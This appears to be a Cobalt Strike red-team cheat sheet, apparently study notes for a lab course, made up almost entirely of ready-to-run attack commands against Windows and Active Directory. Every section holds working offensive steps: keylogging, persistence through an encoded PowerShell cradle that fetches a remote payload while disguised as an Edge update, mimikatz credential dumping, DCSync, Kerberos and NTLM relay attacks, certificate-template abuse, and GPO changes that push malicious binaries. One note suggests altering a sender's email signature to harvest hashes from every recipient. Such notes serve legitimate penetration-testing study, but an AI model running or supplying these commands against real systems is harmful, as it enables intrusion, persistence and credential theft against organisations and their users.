

# Cheat Sheet

```bash
# Start server (profile is optional)
./teamserver $BIND_IP PASSWORD /path/to/profile
cd ~/cs/Server;./teamserver 192.168.1.18 'Password123!' ~/cs/custom.profile

# Start client
cd ~/cs/Client;./cobaltstrike-client.sh
```

## Enumeration

### Local

```powershell
# Housekeeping
checkin
sleep 0

# Session info
getuid
run whoami /all
ps
clipboard
net logons

# Enumerate services
run wmic service get name,pathname
powershell Get-Acl -Path "$SERVICE_PATH" | fl
powershell-import C:\Tools\Get-ServiceAcl.ps1
powerpick Get-ServiceAcl -Name $SERVICE_NAME | select -expand Access

# Enumerate network info
run netstat -anp tcp

# Screenshot
screenshot
printscreen # PrintScr method
screenwatch # Periodic screenshots

# Keylogger (View -> Keystrokes)
keylogger

# Stop jobs including keylogger
jobs
jobkill $JID
```

### Domain

```powershell
# Enumerate domain info (PowerView)
powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1

# Domain
powerpick Get-NetDomain
powerpick Get-NetComputer | select dnshostname | Resolve-IPAddress
powerpick Get-DomainController | select forest,name,osversion | fl
powerpick Get-DomainPolicyData | select -expand SystemAccess

# Trusts
powerpick Get-DomainTrustMapping | select sourcename,targetname,trusttype,trustattributes,trustdirection

# Users, groups and OUs
powerpick Get-NetUser -Properties samaccountname,memberof,useraccountcontrol | fl
powerpick Get-NetGroup | where Name -like "*Admins*" | select samaccountname
powerpick Get-NetGroupMember "Domain Admins" | select memberdistinguishedname
powerpick Get-NetOU -Properties name,distinguishedname | fl

# GPOs
powerpick Get-NetGPO | select displayname
powerpick Get-DomainGPOLocalGroup | select gpodisplayname,groupname
powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select objectname,gpodisplayname,containername,computername | fl

# Using SharpView instead
execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain

# Custom LDAP queries (requires ADSearch - https://github.com/tomcarver16/ADSearch)
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
```

## Persistence

```powershell
# Scheduled task (hourly)
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -noni -ep bypass -w hidden -e aQBlAHgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACcAKQApAAoA" -n "MicrosoftEdgeUpdateTaskMachineExt" -m add -o hourly

# Startup folder (on login)
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -noni -ep bypass -w hidden -e aQBlAHgAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbgBpAGMAawBlAGwAdgBpAHAAZQByAC4AYwBvAG0ALwBhACcAKQApAAoA" -f "EdgeEnvSetup" -m add

# Regsitry autorun (on boot)
mkdir C:\ProgramData\System
cd C:\ProgramData\System
upload C:\Payloads\MicrosoftEdgeUpdater.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\System\MicrosoftEdgeUpdater.exe" -a "/q /n" -k "hkcurun" -v "MicrosoftEdgeUpdater" -m add

# New service (requires SYSTEM, on boot, useful with tcp-local payload)
cd C:\Windows
upload C:\Payloads\MicrosoftEdgeUpdater.svc.exe
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\MicrosoftEdgeUpdater.svc.exe" -n "MicrosoftEdgeUpdater" -m add

# WMI event subscription (requires powerlurk - https://github.com/Sw4mpf0x/PowerLurk, on target process, flagged by defender?)
cd C:\Windows
upload C:\Payloads\dns_x64.exe
powershell-import C:\Tools\PowerLurk.ps1
powerpick Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

## LPE

```powershell
# Execute automated tools
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

# Abuse SeImpersonatePrivilege
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -e $CRADLE"
connect localhost 4444

# Bypass UAC (requires ElevateKit - https://github.com/rsmudge/ElevateKit, flagged by defender, useful with tcp-local payload)
elevate uac-schtasks $LISTENER_NAME

# Dump local credentials with mimikatz (! elevates to system, replacing token::elevate)
mimikatz !sekurlsa::logonpasswords; !sekurlsa::ekeys; !lsadump::sam; !lsadump::secrets; !lsadump::cache

# Dump TGTs with rubeus
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:$LUID /service:krbtgt /nowrap

# DCSync
make_token $NETBIOS\$USER $PASSWD
dcsync $FQDN $NETBIOS\krbtgt
```

### Kerberos Relay

```powershell
# Make new machine account to leverage for RBCD
execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer BEANS --make

# Check SID for new machine account
powerpick Get-DomainComputer -Identity BEANS -Properties objectsid

# Check for available port
execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe

# Leveraging RBCD
execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/$DC_FQDN -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd $BEANS_SID -port $OPEN_PORT

# Verify attribute is now populated
powerpick Get-DomainComputer -Identity $HOSTNAME -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

# Abusing RBCD
PS > C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:$DOMAIN /user:BEANS$ /password:'$PASSWD'
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:BEANS$ /aes256:$AES_HASH /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:BEANS$ /impersonateuser:Administrator /msdsspn:host/$HOSTNAME /ticket:$TICKET /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID

# Leveraging shadow credentials
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:$ACCOUNT
execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/$DC_FQDN -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port $OPEN_PORT
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$ACCOUNT /certificate:$CERT /password:"$PASSWD" /enctype:aes256 /nowrap

# Now leveraging S4U2Self
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/$HOSTNAME /user:$ACCOUNT /ticket:$TICKET /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID
```

**Note:** KrbRelay.exe requires the entry `set tasks_max_size "2097152";` in your C2 profile.

## Impersonation

```powershell
# Pass the hash (requires SYSTEM)
mimikatz sekurlsa::pth /user:$USER /domain:$NETBIOS /ntlm:$NTHASH /run:notepad.exe
steal_token $PID

# Pass the ticket (createnetonly requires SYSTEM, credentials are fake to avoid signature detection)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bing /password:chilling
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:$LUID /ticket:$TICKET
steal_token $PID

# Overpass the hash (use aes256 to avoid signature detection)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$USER /ntlm:$NTHASH /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$USER /aes256:$AES_HASH /domain:$NETBIOS /opsec /nowrap

# Token impersonation (requires SYSTEM)
steal_token $PID

# Store/use stolen tokens
token-store steal $PID
token-store show
token-store use $ID

# Make tokens
make_token $NETBIOS\$USER $PASSWD
remote-exec $CMD

# Revert impersonation
rev2self

# Kill process
kill $PID

# Inject full beacon payload for the specified listener (useful with tcp-local payload)
inject $PID $ARCH $LISTENER_NAME

# Inject arbitrary shellcode from a binary file on attack box
shinject $TO_DO
```

## Lateral Movement

```powershell
# Pivot connect methods
connect $HOST $PORT
link $HOST $PIPE_NAME # ctfmapper

# Lateral movement methods
jump $METHOD $FQDN smb
remote-exec $METHOD $FQDN $CMD

# Seatbelt
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe OSInfo -ComputerName=web

# WinRM
jump winrm64 $FQDN smb

# Psexec
jump psexec64 $FQDN smb
jump psexec_psh $FQDN smb # x86, uses powershell one-liner instead of binary on target

# WMI
cd \\$FQDN\ADMIN$
upload C:\Payloads\smb_x64.exe
remote-exec wmi $FQDN C:\Windows\smb_x64.exe
link $FQDN ctfmapper

# CoInitializeSecurity COM object issue
make_token $NETBIOS\$USER $PASSWD
remote-exec wmi $FQDN C:\Windows\smb_x64.exe # If fails, use SharpWMI instead
execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Release\SharpWMI.exe action=exec computername=$FQDN command="C:\Windows\smb_x64.exe"
link $FQDN ctfmapper

# DCOM
powershell-import C:\Tools\Invoke-DCOM.ps1
powerpick Invoke-DCOM -ComputerName $FQDN -Method MMC20.Application -Command C:\Windows\smb_x64.exe
link $FQDN ctfmapper
```

### Session Passing

```powershell
# Leverage long-haul beacon to spawn risky session
spawn $ARCH $LISTENER_NAME

# Spawn new process using local binary file
shspawn $ARCH $LOCAL_BIN_FILE
```

## DPAPI

```powershell
# Enumerate credential vaults natively
run vaultcmd /list
run vaultcmd /listcreds:"Windows Credentials" /all
run vaultcmd /listcreds:"Web Credentials" /all
# Or using Seatbelt
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault

# Enumerate credential blob files
ls C:\Users\$USER\AppData\Local\Microsoft\Credentials
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsCredentialFiles

# View encrypted masterkeys
ls C:\Users\bfarmer\AppData\Roaming\Microsoft\Protect\$SID

# Enumerate decrypted masterkeys
mimikatz !sekurlsa::dpapi

# Enumerate decrypted masterkeys instead using Microsoft BackupKey Remote Protocol (MS-BKRP, requires impersonating key owner)
mimikatz dpapi::masterkey /in:C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SID\$GUID /rpc

# Decrypt credential blob
mimikatz dpapi::cred /in:C:\Users\$USER\AppData\Local\Microsoft\Credentials\$CRED_BLOB /masterkey:$MASTERKEY
```

### Scheduled Task Credentials

```powershell
# Check for credential blob files
ls C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

# Check GUID associated with encryption
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\$CRED_BLOB

# Dump cached masterkey
mimikatz !sekurlsa::dpapi

# Decrypt using associated masterkey for credential's GUID
mimikatz dpapi::cred /in:C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\$CRED_BLOB /masterkey:$MASTERKEY
```

## Kerberos

### Enumeration

```powershell
# Kerberoast all possible users
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap

# Targeted Kerberoast specific users (more stealthy by avoiding honeypot accounts)
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,serviceprincipalname,samaccountname
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:$USER /nowrap

# Targeted ASREP roast specific users (more stealthy by avoiding honeypot accounts)
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:$USER /nowrap

# Enumerate KUD
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Enumerate KCD
execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json

# Enumerate RBCD
powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "$DOMAIN_SID-[\d]{4,10}" }
```

### Abuse

```powershell
# Dump tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:$LUID /nowrap

# Abuse dumped TGT
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID

# Abuse PrinterBug
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe $TARGET $LISTENER

# Abuse KCD with dumped ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:$PRIVILEGED_USER /msdsspn:$TARGET_SPN /altservice:$NEW_SERVICE /user:$USER /ticket:$TICKET /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID

# Abuse S4U2Self with dumped ticket
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:$PRIVILEGED_USER /self /altservice:$NEW_SPN /user:$USER /ticket:$TICKET /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID

# Abuse RBCD
powerpick Get-DomainComputer -Identity wkstn-2 -Properties objectSid
powerpick $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$PRINCIPAL_SID)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer "$TARGET_COMPUTER" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:$PRIVILEGED_USER /msdsspn:$TARGET_SPN /user:$USER /ticket:$TICKET /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID
# Cleanup
powerpick Get-DomainComputer -Identity $ACCOUNT | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

# Make computer if needed
powerpick Get-DomainObject "$DOMAIN_DN" -Properties ms-ds-machineaccountquota
execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer BEANS --make
PS > C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /password:$PASSWD /user:BEANS$ /domain:$DOMAIN
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:BEANS$ /aes256:$AES_HASH /nowrap

# Shadow credential
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:$TARGET_ACCOUNT
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:$TARGET_ACCOUNT
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$TARGET_ACCOUNT /certificate:$CERT /password:"$PASSWD" /nowrap
# Cleanup
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:$TARGET_ACCOUNT
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:$TARGET_ACCOUNT /deviceid:$DEVICE_ID
```

## Pivoting

```powershell
# socks4 proxy
socks 1080
# /etc/proxychains4.conf
socks4 127.0.0.1 1080

# socks5 proxy
socks 1080 socks5 disableNoAuth myUser myPassword enableLogging
# /etc/proxychains4.conf
socks5 127.0.0.1 1080 myUser myPassword

# Inspect 1080 bound to team server
$ sudo ss -lntp
```

### Using Proxifier Connection

```powershell
# Leveraging user password 
PS > runas /netonly /user:DEV\bfarmer mmc.exe

# Leveraging user hash
mimikatz > privilege::debug
mimikatz > sekurlsa::pth /domain:$NETBIOS /user:$USER /ntlm:$NTHASH /run:mmc.exe

# Leveraging current session
PS > $cred = Get-Credential
PS > Get-ADComputer -Server $DC_IP -Filter * -Credential $cred | select DNSHostName
```

**Note:** ICMP and SYN scans cannot be tunnelled, so we must disable ping discovery `-Pn` and specify TCP scans `-sT` to scan with nmap through a socks proxy.

### From Linux

```powershell
# Get TGT
$ proxychains getTGT.py -dc-ip $DC_IP -aesKey $AES_HASH $DOMAIN/$USER
$ export KRB5CCNAME=$USER.ccache

# Using psexec
$ proxychains psexec.py -dc-ip $DC_IP -target-ip $TARGET_IP -no-pass -k $DOMAIN/$USER@$FQDN

# Exporting local credentials
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe tgtdeleg /nowrap
$ echo -en '$TICKET' | base64 -d > bfarmer.kirbi
$ ticketConverter.py bfarmer.kirbi bfarmer.ccache
proxychains mssqlclient.py -dc-ip $DC_IP -no-pass -k $DOMAIN/$USER@$FQDN
```

### Reverse Port Forward

```powershell
# Port forward 8080 from the target to 80 on our machine
rportfwd 8080 127.0.0.1 80

# Verify listening remote port
run netstat -anp tcp

# Add corresponding firewall rule
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
powershell Remove-NetFirewallRule -DisplayName "8080-In" # Cleanup
```

### NTLM Relaying

```powershell
# Create firewall exception for inbound ports
powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# Create reverse port forwards
rportfwd 8445 localhost 445
rportfwd 8080 localhost 80

# Start socks proxy to allow relay back to internal target
socks 1080

# Start ntlmrelayx (cradle is pointing at http://10.10.123.102:8080/b, where 10.10.123.102 is rportfwd host and /b is an SMB payload)
sudo proxychains ntlmrelayx.py -t smb://$TARGET_IP -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -e $CRADLE'

# Upload PortBender
cd C:\Windows\system32\drivers
upload C:\Tools\PortBender\WinDivert64.sys

# Load PortBender.cna from C:\Tools\PortBender
help PortBender

# Execute PortBender
PortBender redirect 445 8445

# Coerce NTLM auth
PS > dir \\$BENT_IP\relayme

# Link SMB beacon
link $FQDN ctfmapper

# Kill portbender job
jobs
jobkill $JID
kill $PID
```

**Note:** Using PortBender to redirect 445 will break any legitimate SMB service on the target machine.

### NTLM Auth Methods

```powershell
# Manual
PS > dir \\$BENT_IP\relayme

# Email
<img src="\\$BENT_IP\test.ico" height="1" width="1" />

# Windows shortcut (triggers when viewed in explorer)
PS > $wsh = new-object -ComObject wscript.shell
PS > $shortcut = $wsh.CreateShortcut("\\$HOSTNAME\software\test.lnk")
PS > $shortcut.IconLocation = "\\$BENT_IP\test.ico"
PS > $shortcut.Save()

# Standard windows coerced auths (PetitPotam, SpoolSample, ect.)
```

**Note:** A sneakier means may be to modify the sender's email signature, so that even legitimate emails they send will trigger NTLM authentication from every recipient who reads them.

### WebDAV

```powershell
# Local enumeration
PS > sc qc WebClient

# Remote enumeration
inline-execute C:\Tools\GetWebDAVStatus\GetWebDAVStatus_BOF\GetWebDAVStatus_x64.o $HOSTNAME_1,$HOSTNAME_2

# Start ntlmrelayx targeting RBCD
sudo proxychains ntlmrelayx.py -t ldaps://$DC_IP --delegate-access -smb2support --http-port 8888

# Start reverse port foward
powershell New-NetFirewallRule -DisplayName "8888-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8888
rportfwd 8888 localhost 8888

# Trigger PrinterBug
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe $TARGET_HOSTNAME $LISTENING_HOSTNAME@8888/pwned

# Abuse newly acquired RBCD
PS > C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:$DOMAIN /user:$ACCOUNT /password:'$PASSWD'
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:$ACCOUNT /impersonateuser:$PRIVILEGED_USER /msdsspn:$TARGET_SPN /aes256:$AES_HASH /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID
# Cleanup
powerpick Get-DomainComputer -Identity $ACCOUNT | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

# Targeting shadow credentials instead
sudo proxychains ntlmrelayx.py -t ldaps://$DC_IP --shadow-credentials -smb2support --http-port 8888
cat ROsU1G59.pfx | base64 -w 0
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$ACCOUNT /enctype:aes256 /certificate:$BASE64_CRT /password:$PFX_PASS /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID
# Cleanup
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:$TARGET_ACCOUNT
execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:$TARGET_ACCOUNT /deviceid:$DEVICE_ID
```

## AD CS

```powershell
# Enumerate CAs
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas

# Enumerate vulnerable templates
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable

# Abusing ESC1
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
$ cat cert.pfx | base64 -w 0
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$USER /certificate:$BASE64_CERT /password:$PFX_PASS /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:$NETBIOS /username:$USER /password:fakepass /ticket:$TICKET
steal_token $PID

# Abusing ESC8
powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445
rportfwd 8445 localhost 445
socks 1080
cd C:\Windows\system32\drivers
upload C:\Tools\PortBender\WinDivert64.sys
PortBender redirect 445 8445
sudo proxychains ntlmrelayx.py -t https://$ADCS_IP/certsrv/certfnsh.asp -smb2support --adcs --no-http-server
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe $TARGET_HOSTNAME $LISTENING_HOSTNAME
# Cleanup
jobs
jobkill $JID
kill $PID
```

### Persistence

```powershell
# Enumerate local user certificates
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe Certificates

# Obtain TGT from local user certificate
mimikatz crypto::certificates /export
download $EXPORTED_FILE.pfx
$ cat /mnt/c/Users/Attacker/Desktop/$EXPORTED_FILE.pfx | base64 -w 0
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$USER /enctype:aes256 /certificate:$BASE64_CERT /password:mimikatz /nowrap

# Request a user certificate if none are found locally
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:$CA /template:User

# Obtain TGT from local computer certificate (requires SYSTEM)
mimikatz !crypto::certificates /systemstore:local_machine /export
download $EXPORTED_FILE.pfx
$ cat /mnt/c/Users/Attacker/Desktop/$EXPORTED_FILE.pfx | base64 -w 0
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:$MACHINE_ACC /enctype:aes256 /certificate:$BASE64_CERT /password:mimikatz /nowrap

# Request a machine certificate if none are found localy (requires SYSTEM)
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:$CA /template:Machine /machine
```

## GPO

```powershell
# Enumerate GPOs
powerpick Get-DomainGPO -Properties * | select displayname,name
```

### Modify Existing

```powershell
# Enumerate non-default SIDs that have privileges over existing GPOs
powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|DeleteChild|DeleteTree|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' } | select @{Name='SecurityIdentifier';Expression={Convert-SIDToName -SID $_.SecurityIdentifier}},ActiveDirectoryRights,ObjectDN | sort -Property SecurityIdentifier

# Resolve GPO name and SID of the principal
powerpick Get-DomainGPO -Identity "CN={$GPO_GUID},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayname,gpcfilesyspath

# Get OUs linked to GPO
powerpick Get-DomainOU -GPLink "{$GPO_GUID}" | select distinguishedname

# Enumerate OUs for computers
powerpick Get-DomainOU | foreach { $ou = $_.distinguishedname; Get-DomainComputer -SearchBase $ou -Properties dnshostname | select @{Name='OU';Expression={$ou}},dnshostname}

# Find internal writable share
powerpick Find-DomainShare -CheckShareAccess

# Host malicious binary on internal share

# Modify GPO with startup script
execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\$CONTROLLED_HOSTNAME\$WRITABLE_SHARE\dns_x64.exe" --GPOName "$MODIFIABLE_GPO"

# Update target locally (or wait a while)
PS > gpupdate /force
# Reboot
```

### Create New

```powershell
# Enumerate users/computers with rights to create GPOs
powerpick Get-DomainObjectAcl -Identity ((Get-DomainGPO).distinguishedname -replace 'CN=\{[A-F0-9-]+\},','') -ResolveGUIDs | where { $_.ActiveDirectoryRights -contains "CreateChild" -and $_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$' } | foreach { ConvertFrom-SID $_.SecurityIdentifier }

# Enumerate ACLs for GPO links (GP-Link AceType) in OUs
powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | where { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, @{Name='ResolvedSID';Expression={ConvertFrom-SID $_.SecurityIdentifier}} | fl

# Check if GroupPolicy module is available
powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

# Create new GPO
powershell New-GPO -Name "BigUpdate"

# Find internal writable share
powerpick Find-DomainShare -CheckShareAccess

# Host malicious binary on internal share

# Add autorun key to registry
powershell Set-GPPrefRegistryValue -Name "BigUpdate" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\$CONTROLLED_HOSTNAME\$WRITABLE_SHARE\dns_x64.exe" -Type ExpandString

# Link GPO to target OU
powershell Get-GPO -Name "BigUpdate" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

# Update target locally (or wait a while)
PS > gpupdate /force
